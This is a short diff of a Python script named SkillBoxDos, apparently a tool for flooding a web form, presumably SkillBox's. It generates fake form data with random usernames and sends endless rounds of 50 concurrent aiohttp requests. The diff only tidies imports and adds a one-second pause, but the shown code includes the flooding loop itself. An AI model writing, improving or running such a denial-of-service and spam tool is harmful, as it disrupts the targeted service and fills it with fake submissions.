@@ -1,9 +1,12 @@
-import aiohttp
-from random_username.generate import generate_username
-from random import randint as r
+import time
 import asyncio
+import aiohttp
+from random import randint as r
+from random_username.generate import generate_username
+
 
 R_COUNTER = 0
+
 
 class SkillBoxDos:
 
@@ -47,16 +50,19 @@ class SkillBoxDos:
                 R_COUNTER += 1
                 return resp.status
 
+            
 async def create_pool(number: int) -> list:
     pool = []
     for _ in range(number):
         pool.append(SkillBoxDos().make_request())
     return await asyncio.gather(*pool)
 
+
 if __name__ == '__main__':
     # to do threads or multiprocessing
     asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
     print("Example of sending form: ")
     print(SkillBoxDos().generate_data())
+    time.sleep(1)
     while True:
         asyncio.run(create_pool(50))
